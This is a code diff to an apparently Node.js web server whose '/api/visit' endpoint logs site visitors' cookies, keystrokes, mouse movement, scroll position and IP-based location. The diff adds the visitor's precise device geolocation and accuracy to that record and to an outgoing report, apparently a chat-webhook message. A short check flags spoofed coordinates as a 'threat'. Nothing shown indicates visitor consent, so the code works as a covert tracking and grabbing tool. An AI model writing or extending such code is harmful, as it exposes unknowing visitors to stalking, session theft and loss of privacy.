@@ -264,6 +264,22 @@ function detectSecurityThreats(req, visitorInfo) {
     });
   }
 
+  if (req.body.location && req.body.location !== 'Geolocation not available' && req.body.location !== 'Geolocation not supported') {
+    const { latitude, longitude, accuracy } = req.body.location;
+    if (latitude === 0 && longitude === 0) {
+      threats.push({
+        type: 'Suspicious Location',
+        details: 'Location coordinates are exactly (0, 0), possible spoofing'
+      });
+    }
+    if (accuracy > 1000) {
+      threats.push({
+        type: 'Low Location Accuracy',
+        details: `Location accuracy is low: ${accuracy} meters`
+      });
+    }
+  }
+
   return threats;
 }
 
@@ -337,6 +353,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       currentUrl: req.body.currentUrl || 'Unknown',
       scrollPosition: req.body.scrollPosition || 'Unknown',
       cookies: JSON.stringify(req.cookies) || '{}',
+      location: req.body.location || 'Unknown',
       part3: {
         keystrokes: req.body.part3?.keystrokes || 'None',
         mouseMovementFrequency: req.body.part3?.mouseMovementFrequency || 'Unknown',
@@ -384,7 +401,8 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       { name: 'Region', value: visitorInfo.region, inline: true },
       { name: 'City', value: visitorInfo.city, inline: true },
       { name: 'ZIP', value: visitorInfo.zip || 'N/A', inline: true },
-      { name: 'Coordinates', value: `(${visitorInfo.latitude}, ${visitorInfo.longitude})`, inline: true },
+      { name: 'IP-based Coordinates', value: `(${visitorInfo.latitude}, ${visitorInfo.longitude})`, inline: true },
+      { name: 'Device Location', value: visitorInfo.location !== 'Unknown' ? `(${visitorInfo.location.latitude}, ${visitorInfo.location.longitude}, Accuracy: ${visitorInfo.location.accuracy}m)` : visitorInfo.location, inline: true },
       { name: 'ISP', value: visitorInfo.isp, inline: true },
       { name: 'Organization', value: visitorInfo.organization || 'N/A', inline: true },
       { name: 'AS', value: visitorInfo.as || 'N/A', inline: true },
